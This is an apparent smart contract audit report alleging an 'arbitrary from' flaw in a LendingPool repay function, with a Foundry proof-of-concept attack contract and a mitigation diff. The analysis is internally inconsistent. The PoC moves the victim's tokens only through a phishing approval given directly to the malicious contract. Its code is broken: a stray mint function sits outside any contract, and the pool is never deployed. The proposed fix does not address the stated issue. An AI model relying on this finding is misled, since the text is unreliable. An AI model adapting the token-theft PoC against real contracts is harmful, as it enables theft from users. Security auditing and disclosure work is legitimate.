# Arbitrary "From" Vulnerability in LendingPool's Repay Function

### Summary

A missing validation in the repay function will cause a loss of funds for users who approve the LendingPool contract as an attacker will steal their tokens by repaying loans with the victim's funds.

### Root Cause

In LendingPool.sol:200 the repay function uses safeTransferFrom to pull tokens from _msgSender() but doesn't validate that the tokens actually belong to the sender. This allows the leverager to repay loans using tokens from any address that has approved the LendingPool.

https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L200

### Internal Pre-conditions

1. A user must approve the LendingPool contract to spend their tokens (a common action for depositing)
2. The LendingPool must have a leverager set
3. There must be an existing loan in the system that can be repaid

### External Pre-conditions

1) The ERC20 token implementation must follow the standard transfer behavior and not implement additional security checks
2) The victim must have sufficient token balance to cover the repayment amount
3) The victim's approval to the LendingPool must be greater than or equal to the repayment amount

### Attack Path

1) Victim approves the LendingPool contract to spend their tokens (for legitimate purposes like depositing)
2) Attacker (or malicious leverager) calls the repay function in the LendingPool
3) The LendingPool pulls tokens from the victim instead of the attacker
4) The victim's tokens are used to repay someone else's loan without their consent


### Impact

The victim suffers a complete loss of the tokens used for repayment. The attacker benefits by having their loan repaid without spending their own tokens.

```javascript
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

// Malicious Leverager Contract
// This shows how a malicious implementation of the leverager could steal user funds
contract MaliciousLeverager {
    address public lendingPool;

    constructor(address _lendingPool) {
        lendingPool = _lendingPool;
    }

    // Malicious repay function that steals from the victim
    function maliciousRepay(address asset, address victim, uint256 amount) external {
        // Call the LendingPool's repay function
        // This will take tokens from us (the leverager)
        // But we can then immediately take them from the victim
        LendingPool(lendingPool).repay(asset, amount);

        // After repayment, we steal from the victim to compensate
        // The victim has approved the LendingPool so we exploit that
        IERC20(asset).transferFrom(victim, address(this), amount);

        console.log("Malicious leverager stole", amount, "tokens from victim");
    }

    // Allow the contract to receive tokens via transfer
    function transferTokens(address token, address to, uint256 amount) external {
        IERC20(token).transfer(to, amount);
    }
}

contract ArbitraryFromPOC is Test {
    LendingPool public lendingPool;
    MockERC20 public mockToken;
    address public owner;
    address public victim;
    MaliciousLeverager public maliciousLeverager;
    address public yTokenAddress;

    function setUp() public {
        // Set up accounts
        owner = address(0x1);
        victim = address(0x3);

        // Deploy mock token
        vm.startPrank(owner);
        mockToken = new MockERC20("Mock Token", "MOCK");

        // Deploy LendingPool

        // Initialize the reserve for the mock token
        lendingPool.initReserve(address(mockToken));

        // Get the yToken address
        yTokenAddress = lendingPool.getYTokenAddress(address(mockToken));

        maliciousLeverager = new MaliciousLeverager(address(lendingPool));

        // Set our contract as the leverager
        lendingPool.setLeverager(address(maliciousLeverager));

        // Give tokens to victim and malicious leverager
        mockToken.transfer(victim, 100_000 * 10 ** 18);
        mockToken.transfer(address(maliciousLeverager), 50_000 * 10 ** 18);

        // Have owner provide some liquidity
        mockToken.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(address(mockToken), 500_000 * 10 ** 18, owner);

        vm.stopPrank();

        // Create a borrow by the leverager
        vm.startPrank(address(maliciousLeverager));
        mockToken.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(address(mockToken), 10_000 * 10 ** 18);
        vm.stopPrank();

        // Log the setup
        console.log("\n=== SETUP COMPLETE ===");
        console.log("Total liquidity in the pool:", lendingPool.totalLiquidityOfReserve(address(mockToken)));
        console.log("Total borrows:", lendingPool.totalBorrowsOfReserve(address(mockToken)));
    }

    function testVulnerability() public {
        console.log("\n=== VULNERABILITY DEMONSTRATION ===");

        // First, the victim needs to approve the LendingPool for deposits
        // This is a normal operation users would do
        vm.startPrank(victim);
        mockToken.approve(address(lendingPool), type(uint256).max);
        console.log("Victim approved LendingPool for deposits");
        vm.stopPrank();

        // The malicious leverager can also get the victim to approve the malicious contract directly
        // (For example through phishing, front-end manipulation, etc.)
        vm.startPrank(victim);
        mockToken.approve(address(maliciousLeverager), type(uint256).max);
        console.log("Victim approved malicious leverager (e.g. through phishing)");
        vm.stopPrank();

        // Store balances before the attack
        uint256 victimBalanceBefore = mockToken.balanceOf(victim);
        uint256 leveragerBalanceBefore = mockToken.balanceOf(address(maliciousLeverager));
        uint256 yTokenBalanceBefore = mockToken.balanceOf(yTokenAddress);

        console.log("\n=== BEFORE ATTACK ===");
        console.log("Victim balance:", victimBalanceBefore);
        console.log("Malicious leverager balance:", leveragerBalanceBefore);
        console.log("yToken balance:", yTokenBalanceBefore);

        console.log("\n=== EXECUTING ATTACK ===");
        console.log("Malicious leverager will repay its own loan using victim's funds");

        // Exploit: the malicious leverager repays its loan but immediately compensates itself with victim funds
        uint256 attackAmount = 10_000 * 10 ** 18;

        // Anyone can trigger the attack once approvals are in place
        vm.prank(address(0x999)); // Random attacker calls the function
        maliciousLeverager.maliciousRepay(address(mockToken), victim, attackAmount);

        // Check balances after the attack
        uint256 victimBalanceAfter = mockToken.balanceOf(victim);
        uint256 leveragerBalanceAfter = mockToken.balanceOf(address(maliciousLeverager));
        uint256 yTokenBalanceAfter = mockToken.balanceOf(yTokenAddress);

        console.log("\n=== AFTER ATTACK ===");
        console.log("Victim balance:", victimBalanceAfter);
        console.log("Malicious leverager balance:", leveragerBalanceAfter);
        console.log("yToken balance:", yTokenBalanceAfter);
        console.log("Victim lost:", victimBalanceBefore - victimBalanceAfter);

        // Verify that victim's tokens were stolen
        assertLt(victimBalanceAfter, victimBalanceBefore, "Victim should have lost tokens");
        assertEq(leveragerBalanceAfter, leveragerBalanceBefore, "Leverager balance should remain unchanged");
        assertGt(yTokenBalanceAfter, yTokenBalanceBefore, "yToken should have gained tokens");
    }
}
```

### Mitigation

To fix this vulnerability, the protocol should modify the repay function to ensure tokens are only taken from the leverager:

```diff
function repay(address asset, uint256 amount) external nonReentrant returns (uint256) {
    require(msg.sender == leverager, "borrower not leverager");
    DataTypes.ReserveData storage reserve = getReserve(asset);
    // update states
    reserve.updateState();

    if (amount > reserve.totalBorrows) {
        amount = reserve.totalBorrows;
    }

    reserve.totalBorrows -= amount;
    reserve.underlyingBalance += amount;

    // Add this require statement to ensure tokens come from the leverager
+    require(IERC20(asset).balanceOf(_msgSender()) >= amount, "insufficient balance for repayment");
    
    // Transfer the underlying tokens from the vaultPosition to the yToken contract
    IERC20(asset).safeTransferFrom(_msgSender(), reserve.yTokenAddress, amount);

    reserve.updateInterestRates();

    return amount;
}
```
